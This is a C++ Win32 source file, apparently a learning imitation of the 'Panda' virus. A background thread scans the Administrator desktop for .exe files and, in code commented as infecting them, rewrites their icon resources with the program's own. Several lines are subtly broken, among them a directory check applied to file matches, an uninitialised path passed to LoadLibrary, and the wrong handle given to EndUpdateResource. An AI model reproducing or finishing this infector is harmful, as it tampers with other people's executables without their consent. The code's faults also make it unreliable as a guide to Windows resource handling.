// Panda.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "Panda.h"

#include <cstdio>

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
// 工作线程处理函数
DWORD WINAPI WorkProc(LPVOID lpParam);
// 设置修改程序图标
BOOL SetExeIcon(char* szCurrentExePath, char* szObjectPath);
// 枚举资源名称回调函数
BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPCTSTR lpszName, LONG lParam);

// 入口函数
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此处放置代码。

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_PANDA, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_PANDA));

    MSG msg;

    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_PANDA));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_PANDA);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE: // 窗口创建消息
        // 创建一个线程
        CreateThread(NULL, NULL, WorkProc, NULL, 0, NULL);
        break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

DWORD WINAPI WorkProc(LPVOID lpParam)
{
    WIN32_FIND_DATA wfd = { 0 };
    HANDLE hFinder = FindFirstFile("C:\\Users\\Administrator\\Desktop\\*.exe", &wfd);
    if (hFinder == INVALID_HANDLE_VALUE)
        return 0;

    while (true)
    {
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
	        // 获取程序路径
            char szExePath[MAX_PATH];
            sprintf(szExePath, "%s\\%s", "C:\\Users\\Administrator\\Desktop", wfd.cFileName);
            MessageBox(NULL, szExePath, "提示", MB_OK);
            // 感染exe
            char szCurrentPath[MAX_PATH];
            SetExeIcon(szCurrentPath, szExePath);
        }

        if (!FindNextFile(hFinder, &wfd))
            break;
    }
    return 0;
}

// 设置修改程序图标
BOOL SetExeIcon(char* szCurrentExePath, char* szObjectPath)
{
    HMODULE hExe = LoadLibrary(szCurrentExePath);
    // 枚举二进制模块指定的资源类型
    EnumResourceNames(hInst, RT_ICON, ENUMRESNAMEPROCA(EnumIconProc), (LONG)szObjectPath);
    return TRUE;
}

// 枚举资源名称回调函数
BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPCTSTR lpszName, LONG lParam)
{
    // 查找资源
    HRSRC hRes = FindResource(hModule, lpszName, RT_ICON);
    if (hRes == NULL)
        return FALSE;

    // 加载资源
    HGLOBAL hResLoad = LoadResource(hModule, hRes);

    // 对句柄加锁
    LPVOID pData = LockResource(hResLoad);
    if (pData == NULL)
        return FALSE;

    DWORD dwSize = SizeofResource(hModule, hRes);

    if (lParam)
    {
	    // 设置资源
        // 开始更新资源
        HANDLE hExe = BeginUpdateResource(LPCTSTR(lParam), FALSE);
        if (hExe == NULL)
            return FALSE;

        int nRet = UpdateResource(hExe, RT_ICON, lpszName, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEPALI_NEPAL), pData, dwSize);

        if (!nRet)
            return FALSE;

        EndUpdateResource(hRes, FALSE);
    }
    return TRUE;
}